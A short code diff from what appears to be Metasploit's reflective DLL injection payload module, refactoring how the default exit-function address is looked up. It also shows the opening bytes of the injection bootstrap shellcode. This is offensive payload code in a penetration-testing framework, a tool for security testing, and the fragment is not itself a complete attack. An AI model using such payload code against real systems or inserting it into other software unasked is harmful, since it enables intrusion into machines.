@@ -71,7 +71,7 @@ module Payload::Windows::ReflectiveDllInject
       return
     end
 
-    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+    exit_funk = [ EXIT_FUNCTION_ADDRESS_BY_TECHNIQUE[DEFAULT_EXIT_TECHNIQUE] ].pack( "V" )
 
     bootstrap = "\x4D" +                            # dec ebp             ; M
           "\x5A" +                            # pop edx             ; Z
